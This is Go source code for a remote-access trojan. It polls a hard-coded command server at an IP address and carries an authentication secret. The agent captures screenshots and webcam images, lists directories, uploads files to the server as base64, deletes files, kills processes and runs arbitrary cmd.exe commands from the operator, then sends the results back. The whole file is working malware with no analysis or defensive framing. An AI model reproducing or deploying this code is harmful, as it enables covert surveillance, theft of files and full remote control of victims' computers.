package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"image/png"

	"github.com/kbinani/screenshot"
)

const (
	ServerURL  = "http://45.76.76.74:43445"
	SecretAuth = "COSMOS0611"
)

func getClientID() string {
	host, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	return fmt.Sprintf("%s_%s", host, user)
}

func takeScreenshot() string {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "Error: No displays"
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "Error: " + err.Error()
	}

	var buf bytes.Buffer
	png.Encode(&buf, img)
	return "IMAGE:SCREEN:" + base64.StdEncoding.EncodeToString(buf.Bytes())
}

func getWebcam() string {
	// Использование внешней утилиты CommandCam
	cmd := exec.Command("cmd", "/c", "CommandCam.exe /filename snap.jpg")
	err := cmd.Run()
	if err != nil {
		return "Error: CommandCam not found or failed. Place CommandCam.exe in agent folder."
	}
	data, err := ioutil.ReadFile("snap.jpg")
	if err != nil {
		return "Error reading image"
	}
	defer os.Remove("snap.jpg")
	return "IMAGE:WEBCAM:" + base64.StdEncoding.EncodeToString(data)
}

func listFiles(path string) string {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		return "Error: " + err.Error()
	}
	var b strings.Builder
	b.WriteString(fmt.Sprintf("Directory of %s\n\n", path))
	for _, f := range files {
		typeStr := "FILE"
		if f.IsDir() {
			typeStr = "DIR "
		}
		b.WriteString(fmt.Sprintf("%s | %10d | %s\n", typeStr, f.Size(), f.Name()))
	}
	return b.String()
}

func executeCommand(task string) string {
	parts := strings.SplitN(task, " ", 2)
	cmdType := parts[0]

	switch cmdType {
	case "screenshot":
		return takeScreenshot()
	case "webcam":
		return getWebcam()
	case "ls":
		if len(parts) < 2 {
			return listFiles(".")
		}
		return listFiles(parts[1])
	case "download":
		if len(parts) < 2 {
			return "Usage: download <path>"
		}
		data, err := ioutil.ReadFile(parts[1])
		if err != nil {
			return "Error: " + err.Error()
		}
		return "FILE_DATA:" + filepath.Base(parts[1]) + ":" + base64.StdEncoding.EncodeToString(data)
	case "rmfile":
		if len(parts) < 2 {
			return "Usage: rmfile <path>"
		}
		err := os.Remove(parts[1])
		if err != nil {
			return "Error: " + err.Error()
		}
		return "File deleted successfully."
	case "kill":
		if len(parts) < 2 {
			return "Usage: kill <PID>"
		}
		out, _ := exec.Command("taskkill", "/F", "/PID", parts[1]).CombinedOutput()
		return string(out)
	default:
		out, err := exec.Command("cmd", "/C", task).CombinedOutput()
		if err != nil {
			return err.Error()
		}
		return string(out)
	}
}

func main() {
	cid := getClientID()
	info := os.Getenv("USERNAME") + "@" + os.Getenv("COMPUTERNAME")

	for {
		client := &http.Client{Timeout: 10 * time.Second}
		req, _ := http.NewRequest("GET", ServerURL+"/get_task", nil)
		req.Header.Set("X-Secret-Auth", SecretAuth)
		req.Header.Set("Client-ID", cid)
		req.Header.Set("Client-Info", info)

		resp, err := client.Do(req)
		if err == nil {
			body, _ := io.ReadAll(resp.Body)
			task := string(body)
			resp.Body.Close()

			if task != "" && task != "none" {
				result := executeCommand(task)

				postReq, _ := http.NewRequest("POST", ServerURL+"/send_result", bytes.NewBuffer([]byte(result)))
				postReq.Header.Set("X-Secret-Auth", SecretAuth)
				postReq.Header.Set("Client-ID", cid)
				client.Do(postReq)
			}
		}
		time.Sleep(5 * time.Second)
	}
}
